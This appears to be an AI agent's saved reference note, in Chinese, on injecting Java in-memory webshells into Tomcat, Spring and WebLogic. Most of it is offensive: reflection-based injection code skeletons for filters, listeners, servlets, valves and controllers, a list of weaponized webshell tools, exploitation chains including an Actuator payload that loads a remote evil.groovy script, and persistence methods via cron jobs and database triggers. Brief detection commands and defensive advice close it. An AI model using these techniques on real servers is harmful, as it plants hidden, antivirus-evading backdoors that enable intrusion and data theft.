---
name: kb_memshell_injection_2026
description: Java内存马注入技术—Tomcat Filter/Listener/Servlet/Valve/Spring Controller/Interceptor/WebSocket+武器化工具
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# Java 内存马注入技术专题 (2026版)

## 一、内存马概述

### 什么是内存马
- 无文件落地Webshell，直接驻留在JVM内存中
- 不写磁盘→绕过杀软/EDR/WAF文件检测
- 重启丢失(除非持久化)

### 内存马 vs 常规Webshell
| 特性 | 内存马 | 文件webshell |
|------|--------|------|
| 文件落地 | ❌ 无 | ✅ 有 |
| 杀软扫描 | 不可见 | 可检测 |
| 重启存活 | ❌ 消失 | ✅ 持久 |
| 隐蔽性 | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| 注入难度 | 高 | 低 |

### 主流框架注入点
- **Tomcat**: Filter/Servlet/Listener/Valve/WebSocket
- **Spring**: Controller/Interceptor
- **WebLogic**: Filter/Servlet (T3/IIOP协议)
- **Resin**: Filter/Servlet
- **Jetty**: Filter/Servlet
- **GlassFish**: Filter/Servlet

---

## 二、Tomcat Filter 型内存马 (最常用)

### 原理
动态注册Filter到Tomcat的FilterChain中，拦截所有请求

### 核心步骤
```
1. 获取 ServletContext / ApplicationContext
2. 找到 StandardContext (Tomcat的webapp上下文)
3. 构造FilterDef → 设置filterClass和filterName
4. 构造FilterMap → 映射URL pattern (/*)
5. 添加到 StandardContext: addFilterDef → addFilterMapBefore
6. 通过反射实例化ApplicationFilterConfig → 加入filterConfigs
7. Filter生效
```

### 关键代码骨架
```java
// 1. 获取StandardContext
ServletContext servletContext = request.getServletContext();
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext appContext = (ApplicationContext) appContextField.get(servletContext);
Field stdContextField = appContext.getClass().getDeclaredField("context");
stdContextField.setAccessible(true);
StandardContext stdContext = (StandardContext) stdContextField.get(appContext);

// 2. 创建FilterDef
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("memshell");
filterDef.setFilterClass(evilFilter.getClass().getName());
filterDef.setFilter(evilFilter);

// 3. 创建FilterMap
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("memshell");
filterMap.addURLPattern("/*");

// 4. 注入
stdContext.addFilterDef(filterDef);
// 用反射将filterMap插入filterConfigs
```

### 常用回显方式
- request/response 直接回显 (最简单)
- ThreadLocal 传参
- 写入全局变量
- Response Header 回显

---

## 三、Tomcat Listener 型内存马

### 原理
利用 Tomcat RequestListener/HttpSessionListener 在特定事件触发时执行恶意代码

### 关键类
```java
ServletRequestListener  → requestInitialized()/requestDestroyed()
HttpSessionListener     → sessionCreated()/sessionDestroyed()
ServletRequestAttributeListener → attributeAdded()
```

### 注入方式
```java
StandardContext stdContext = ...;
TomcatShell listener = new TomcatShell(); // implements ServletRequestListener
stdContext.addApplicationEventListener(listener);
```

### 优缺点
- 优点: 不占用URL路径，比Filter更难发现
- 缺点: 在请求到达Filter之前就触发了，可能拿不到完整参数

---

## 四、Tomcat Servlet 型内存马

### 原理
动态注册新的Servlet到Tomcat容器中

```java
Wrapper wrapper = stdContext.createWrapper();
wrapper.setName("servletShell");
wrapper.setServletClass("com.evil.Shell");
wrapper.setServlet(evilServlet);
stdContext.addChild(wrapper);  // 添加到children
stdContext.addServletMappingDecoded("/shell/*", "servletShell");  // 添加路由
```

### 注意事项
- 需要 `/shell` 路径访问
- 容易被扫描工具发现(路径明显)

---

## 五、Tomcat Valve 型内存马 (最隐蔽)

### 原理
Tomcat Valve 是pipeline中的一个组件，比Filter层级更低，可以拦截所有请求

```java
Pipeline pipeline = stdContext.getPipeline();
Valve evilValve = new ValveBase() {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        // 解析命令执行
        getNext().invoke(request, response);
    }
};
pipeline.addValve(evilValve);
```

### 优势
- 在Filter之前触发
- 不注册URL
- 极难检测

---

## 六、Spring 内存马

### Spring Controller 型
```java
// 获取RequestMappingHandlerMapping
WebApplicationContext ctx = RequestContextUtils.findWebApplicationContext(request);
RequestMappingHandlerMapping mapping = ctx.getBean(RequestMappingHandlerMapping.class);

// 反射注册Controller方法
Method method = EvilController.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
RequestMappingInfo info = RequestMappingInfo.paths("/shell").methods(RequestMethod.GET).build();
mapping.registerMapping(info, "evilController", EvilController.class, method);
```

### Spring Interceptor 型
```java
// 获取InterceptorRegistry
RequestMappingHandlerMapping mapping = ...;
Field adaptedInterceptors = mapping.getClass().getDeclaredField("adaptedInterceptors");
// 加入恶意Interceptor
```

---

## 七、WebLogic Filter 内存马

### WebLogic T3协议注入
```
通过T3协议→获取weblogic.servlet.internal.WebAppServletContext
→ registerFilter → Filter生效
```

### 关键类差异
```java
// WebLogic的ServletContext实现类不同
weblogic.servlet.internal.WebAppServletContext ctx = 
    (WebAppServletContext) request.getServletContext();
// 其余注入逻辑与Tomcat类似，但类名不同
```

---

## 八、武器化工具

### 成熟工具
| 工具 | 特点 |
|------|------|
| **Behinder(冰蝎)** | 加密流量的内存马管理，支持多种加密协议 |
| **Godzilla(哥斯拉)** | 新一代webshell管理，内存马注入模块 |
| **Suo5** | 全双工HTTP隧道，支持内存马 |
| **AntSword** | 老牌蚁剑，社区内存马插件 |
| **msmap** | 内存马生成与注入工具 |
| **MemShellParty** | 专门的内存马注入GUI工具 |
| **JMG(Java Memshell Generator)** | 一键生成各种内存马 |

### Godzilla 内存马特性
```
- Tomcat Filter/Listener/Valve → 全支持
- Spring Controller/Interceptor → 支持
- WebLogic Filter → 支持
- 流量加密: AES/RAW/Base64
- 注入方式: 冰蝎/哥斯拉 payload生成器
```

---

## 九、检测方法

### 手工检测
```
1. 对比Filter/Servlet/Listener数量 (正常vs异常)
2. 检查JMX MBean中是否有异常对象
3. Arthas/HouseMD 检查JVM运行时对象
4. 检查StandardContext.filterConfigs/filterDefs/listenerInstances
```

### 自动化检测
```
1. java-memshell-scanner: 内存马扫描工具
2. Arthas命令: dashboard → 查看线程/类加载
3. Copagent: 自动化内存马查杀
```

### 排查命令 (Arthas)
```bash
# 列出所有Filter
ognl '@org.apache.catalina.core.StandardContext@filterConfigs'

# 查看Servlet
ognl '@org.apache.catalina.core.StandardContext@children'

# 检查异常类加载器
classloader --all
```

---

## 十、实战注入场景

### 场景1: Fastjson反序列化→内存马
```
反序列化触发 → TemplatesImpl加载字节码 → 
在static块中执行内存马注入 → 访问内存马URL
```

### 场景2: Shiro RememberMe→内存马
```
Shiro gadget链 → JNDI/LDAP → 加载恶意class → Filter注入
```

### 场景3: WebLogic未授权→内存马
```
CVE-2023-21839 → JNDI → 加载内存马class → 
IIOP监听器注册 → 长连接Shell
```

### 场景4: Spring Boot Actuator → 内存马
```
POST /actuator/env → spring.main.sources=http://x.x.x.x/evil.groovy
→ Groovy脚本执行 → 反射注册Controller
```

---

## 十一、持久化方案

内存马默认重启丢失，需要持久化：

1. **落地文件备份**: 同时写一个真正的 .jsp 文件做恢复入口
2. **系统定时任务**: Linux cron/Windows scheduled task → 定时重新注入
3. **数据库触发器**: MySQL trigger + UDF → 重启后自动加载
4. **Hook框架启动**: 修改 framework 配置 → 启动时加载恶意模块

---

## 十二、防护建议

1. **升级框架**: 修复已知反序列化漏洞，堵住注入源头
2. **RASP部署**: 监控动态注册Filter/Servlet/Listener行为
3. **定期扫描**: 用 java-memshell-scanner 定期巡检
4. **JVM沙箱**: 限制反射调用 `setAccessible(true)` 和修改运行时结构
5. **日志监控**: 监控异常的Filter/Servlet注册日志